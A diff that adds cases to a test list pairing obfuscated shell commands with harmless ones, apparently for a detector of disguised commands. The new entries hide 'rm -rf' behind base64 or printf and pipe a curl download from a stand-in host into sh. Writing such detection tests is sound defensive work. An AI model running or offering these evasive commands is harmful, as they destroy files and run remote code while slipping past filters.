@@ -179,6 +179,9 @@ OBFUSCATION_CASES = [
     ("echo $(cat f) | sh", "echo $(date) | tee log"),
     ("python3 -c \"exec(open('x').read())\"", "python3 -c \"print(1)\""),
     (r"printf '\x72\x6d'", "printf 'rm'"),
+    ('bash -c "$(echo cm0gLXJmIC4= | base64 --decode)"', "echo $(date) > now.txt"),
+    ('sh -c "$(curl -fsSL https://x.example/i.sh)"', "sh -c 'ls -la'"),
+    ("$(printf rm) -rf src", "x=$(date); echo $x"),
 ]
 
 
